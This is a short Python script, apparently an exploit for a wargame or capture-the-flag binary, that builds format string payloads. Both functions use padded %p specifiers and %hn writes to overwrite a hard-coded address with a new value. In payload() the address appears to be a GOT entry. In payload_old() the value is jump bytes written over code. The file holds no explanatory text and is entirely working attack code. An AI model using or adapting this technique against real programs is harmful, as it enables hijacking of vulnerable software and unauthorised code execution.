#!/usr/bin/env python3

from struct import pack

def payload():
    addr_p1 = 0x08049838
    addr_p2 = addr_p1 + 0x2

    target_p2 = 0x0804
    target_p1 = 0x84a4

    if target_p1 > target_p2:
        target_p1, target_p2 = target_p2, target_p1
        addr_p1, addr_p2 = addr_p2, addr_p1

    print("target_p1:", target_p1)
    print("target_p2:", target_p2)
    buffer = pack('<I', addr_p1) + b"AAAA" + pack('<I', addr_p2)
    written_bytes = 3 * 4
    buffer += b"%010p%010p"
    written_bytes += 2 * 10

    print("Bytes written until now:", written_bytes, "\n" + str(buffer))
    missing_bytes = target_p1 - written_bytes
    print("Bytes to write:", missing_bytes)
    to_write = f"%0{str(missing_bytes)}p%hn"
    buffer += to_write.encode('utf-8')
    written_bytes += missing_bytes

    print("Bytes written until now:", written_bytes, "\n" + str(buffer))
    missing_bytes = target_p2 - written_bytes
    print("Bytes to write:", missing_bytes)
    buffer += b"%0" + str(missing_bytes).encode('utf-8') + b"p%hn"

    return buffer

def payload_old():
    addr_p1 = 0x080483d0
    addr_p2 = addr_p1 + 0x2

    jmp_p1 = 0x66e9
    jmp_p2 = 0xd000

    if jmp_p1 > jmp_p2:
        jmp_p1, jmp_p2 = jmp_p2, jmp_p1
        addr_p1, addr_p2 = addr_p2, addr_p1

    print("jmp_p1:", jmp_p1)
    print("jmp_p2:", jmp_p2)
    buffer = pack('<I', addr_p1) + b"AAAA" + pack('<I', addr_p2)
    written_bytes = 3 * 4
    buffer += b"%010p%010p"
    written_bytes += 2 * 10

    print("Bytes written until now:", written_bytes, "\n" + str(buffer))
    missing_bytes = jmp_p1 - written_bytes
    print("Bytes to write:", missing_bytes)
    to_write = f"%0{str(missing_bytes)}p%hn"
    buffer += to_write.encode('utf-8')
    written_bytes += missing_bytes

    print("Bytes written until now:", written_bytes, "\n" + str(buffer))
    missing_bytes = jmp_p2 - written_bytes
    print("Bytes to write:", missing_bytes)
    buffer += b"%0" + str(missing_bytes).encode('utf-8') + b"p%hn"

    return buffer
    
if __name__ == '__main__':
    print(payload())

